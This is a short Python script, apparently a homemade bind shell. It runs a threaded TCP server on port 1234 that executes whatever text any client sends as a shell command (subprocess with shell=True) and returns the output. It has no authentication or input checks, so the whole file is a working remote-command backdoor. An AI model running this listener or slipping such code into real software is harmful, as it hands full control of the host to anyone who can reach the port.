#!/usr/bin/python3
import socket
import subprocess as sp
import _thread

# create a socket object
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

host = socket.gethostname()
port = 1234
# count de los hilos para multiples clientes
threadCount = 0
serversocket.bind((host, port))
serversocket.listen(2)

def threaded_client(connection):
    while True:
        data = connection.recv(2048)
        process = sp.Popen([data], shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        stdout, stderr = process.communicate()
        connection.send(stdout)
        connection.send(stderr)
        if not data:
            break
    connection.close()

while True:
    clientsocket, address = serversocket.accept()
    print("Got a connection from %s" % str(address))
    _thread.start_new_thread(threaded_client, (clientsocket, ))
    threadCount += 1
    print('Thread Number: ' + str(threadCount))
